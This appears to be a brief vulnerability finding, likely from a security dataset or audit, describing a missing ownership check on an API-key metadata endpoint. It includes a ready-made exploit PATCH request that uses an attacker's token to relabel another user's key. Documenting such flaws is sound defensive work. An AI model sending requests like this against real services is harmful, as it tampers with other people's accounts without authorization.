diagnosis: The endpoint modifies the descriptive metadata and label of an API key using key_id without checking whether key.user_id == current_user.id. Any user can alter labels on other users' API keys.
exploit_request:
PATCH /api/v1/api-keys/7102/metadata HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"label": "Compromised Key", "description": "Altered by unauthorized user"}
